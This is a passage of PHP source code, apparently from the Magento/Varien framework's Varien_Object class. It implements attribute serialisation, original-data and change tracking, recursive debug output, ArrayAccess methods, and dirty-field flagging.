    public function serialize($attributes = array(), $valueSeparator='=', $fieldSeparator=' ', $quote='"')
    {
        $res  = '';
        $data = array();
        if (empty($attributes)) {
            $attributes = array_keys($this->_data);
        }

        foreach ($this->_data as $key => $value) {
            if (in_array($key, $attributes)) {
                $data[] = $key . $valueSeparator . $quote . $value . $quote;
            }
        }
        $res = implode($fieldSeparator, $data);
        return $res;
    }

    /**
     * Get object loaded data (original data)
     *
     * @param string $key
     * @return mixed
     */
    public function getOrigData($key=null)
    {
        if (is_null($key)) {
            return $this->_origData;
        }
        return isset($this->_origData[$key]) ? $this->_origData[$key] : null;
    }

    /**
     * Initialize object original data
     *
     * @param string $key
     * @param mixed $data
     * @return Varien_Object
     */
    public function setOrigData($key=null, $data=null)
    {
        if (is_null($key)) {
            $this->_origData = $this->_data;
        } else {
            $this->_origData[$key] = $data;
        }
        return $this;
    }

    /**
     * Compare object data with original data
     *
     * @param string $field
     * @return boolean
     */
    public function dataHasChangedFor($field)
    {
        $newData = $this->getData($field);
        $origData = $this->getOrigData($field);
        return $newData!=$origData;
    }

    /**
     * Clears data changes status
     *
     * @param boolean $value
     * @return Varien_Object
     */
    public function setDataChanges($value)
    {
        $this->_hasDataChanges = (bool)$value;
        return $this;
    }

    /**
     * Present object data as string in debug mode
     *
     * @param mixed $data
     * @param array $objects
     * @return string
     */
    public function debug($data=null, &$objects=array())
    {
        if (is_null($data)) {
            $hash = spl_object_hash($this);
            if (!empty($objects[$hash])) {
                return '*** RECURSION ***';
            }
            $objects[$hash] = true;
            $data = $this->getData();
        }
        $debug = array();
        foreach ($data as $key=>$value) {
            if (is_scalar($value)) {
                $debug[$key] = $value;
            } elseif (is_array($value)) {
                $debug[$key] = $this->debug($value, $objects);
            } elseif ($value instanceof Varien_Object) {
                $debug[$key.' ('.get_class($value).')'] = $value->debug(null, $objects);
            }
        }
        return $debug;
    }

    /**
     * Implementation of ArrayAccess::offsetSet()
     *
     * @link http://www.php.net/manual/en/arrayaccess.offsetset.php
     * @param string $offset
     * @param mixed $value
     */
    public function offsetSet($offset, $value)
    {
        $this->_data[$offset] = $value;
    }

    /**
     * Implementation of ArrayAccess::offsetExists()
     *
     * @link http://www.php.net/manual/en/arrayaccess.offsetexists.php
     * @param string $offset
     * @return boolean
     */
    public function offsetExists($offset)
    {
        return isset($this->_data[$offset]);
    }

    /**
     * Implementation of ArrayAccess::offsetUnset()
     *
     * @link http://www.php.net/manual/en/arrayaccess.offsetunset.php
     * @param string $offset
     */
    public function offsetUnset($offset)
    {
        unset($this->_data[$offset]);
    }

    /**
     * Implementation of ArrayAccess::offsetGet()
     *
     * @link http://www.php.net/manual/en/arrayaccess.offsetget.php
     * @param string $offset
     * @return mixed
     */
    public function offsetGet($offset)
    {
        return isset($this->_data[$offset]) ? $this->_data[$offset] : null;
    }


    /**
     * Enter description here...
     *
     * @param string $field
     * @return boolean
     */
    public function isDirty($field=null)
    {
        if (empty($this->_dirty)) {
            return false;
        }
        if (is_null($field)) {
            return true;
        }
        return isset($this->_dirty[$field]);
    }

    /**
     * Enter description here...
     *
     * @param string $field
     * @param boolean $flag
     * @return Varien_Object
     */
    public function flagDirty($field, $flag=true)
    {
        if (is_null($field)) {
            foreach ($this->getData() as $field=>$value) {
                $this->flagDirty($field, $flag);
            }
        } else {
            if ($flag) {
                $this->_dirty[$field] = true;
            } else {
                unset($this->_dirty[$field]);
            }
        }
        return $this;
    }
}
